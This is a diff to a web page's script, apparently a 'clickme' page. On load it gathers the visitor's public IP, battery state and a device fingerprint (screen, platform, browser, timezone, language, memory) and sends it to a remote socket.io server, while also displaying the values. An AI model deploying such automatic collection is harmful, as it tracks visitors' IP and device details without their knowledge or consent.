@@ -9,19 +9,38 @@
     <script>
         const socket = io("https://clickme-d5d3.onrender.com/"); // Change this to your server URL
 
-        async function fetchIP() {
+        async function fetchIPv4() {
             try {
-                const response = await fetch("https://api64.ipify.org?format=json");
+                const response = await fetch("https://api.ipify.org?format=json");
                 const data = await response.json();
                 document.getElementById("ipAddress").textContent = data.ip;
                 return data.ip;
             } catch (error) {
+                console.error("❌ Error fetching IPv4:", error);
                 return "Failed to fetch";
             }
         }
 
+        async function getBatteryInfo() {
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    const batteryLevel = `${Math.round(battery.level * 100)}%`;
+                    const chargingStatus = battery.charging ? "Charging" : "Not Charging";
+
+                    document.getElementById("batteryLevel").textContent = batteryLevel;
+                    document.getElementById("chargingStatus").textContent = chargingStatus;
+
+                    return { batteryLevel, chargingStatus };
+                } catch (error) {
+                    console.error("❌ Error fetching battery info:", error);
+                }
+            }
+            return { batteryLevel: "Unknown", chargingStatus: "Unknown" };
+        }
+
         function getDeviceInfo() {
-            return {
+            const deviceInfo = {
                 screenResolution: `${screen.width} x ${screen.height}`,
                 platform: navigator.platform,
                 browser: detectBrowser(),
@@ -30,42 +49,51 @@
                 language: navigator.language,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 darkMode: window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches,
-                deviceMemory: navigator.deviceMemory || "Unknown"
+                deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : "Unknown"
             };
+
+            // Update UI with fetched values
+            document.getElementById("screenResolution").textContent = deviceInfo.screenResolution;
+            document.getElementById("osVersion").textContent = deviceInfo.platform;
+            document.getElementById("browser").textContent = deviceInfo.browser;
+            document.getElementById("touchSupport").textContent = deviceInfo.touchSupport ? "Yes" : "No";
+            document.getElementById("orientation").textContent = deviceInfo.orientation;
+            document.getElementById("language").textContent = deviceInfo.language;
+            document.getElementById("timezone").textContent = deviceInfo.timezone;
+            document.getElementById("darkMode").textContent = deviceInfo.darkMode ? "Enabled" : "Disabled";
+            document.getElementById("deviceMemory").textContent = deviceInfo.deviceMemory;
+
+            return deviceInfo;
         }
 
         function detectBrowser() {
             const ua = navigator.userAgent;
             if (ua.includes("Firefox")) return "Mozilla Firefox";
-            if (ua.includes("Chrome")) return "Google Chrome";
-            if (ua.includes("Safari")) return "Apple Safari";
+            if (ua.includes("Chrome") && !ua.includes("Edg")) return "Google Chrome";
+            if (ua.includes("Safari") && !ua.includes("Chrome")) return "Apple Safari";
             if (ua.includes("Edg")) return "Microsoft Edge";
             if (ua.includes("Opera") || ua.includes("OPR")) return "Opera";
             return "Unknown";
         }
 
-        async function getBatteryInfo() {
-            if ('getBattery' in navigator) {
-                const battery = await navigator.getBattery();
-                document.getElementById("batteryLevel").textContent = `${Math.round(battery.level * 100)}%`;
-                document.getElementById("chargingStatus").textContent = battery.charging ? "Charging" : "Not Charging";
-            }
-        }
-
         async function sendData() {
-            const ip = await fetchIP();
+            const ip = await fetchIPv4();
+            const batteryInfo = await getBatteryInfo();
             const deviceInfo = getDeviceInfo();
+
             const data = {
                 ip,
-                ...deviceInfo
+                ...deviceInfo,
+                batteryLevel: batteryInfo.batteryLevel,
+                chargingStatus: batteryInfo.chargingStatus
             };
+
             console.log("📤 Sending Data:", data);
             socket.emit("deviceData", data);
         }
 
         window.onload = () => {
             sendData();
-            getBatteryInfo();
         };
 
         if ('serviceWorker' in navigator) {
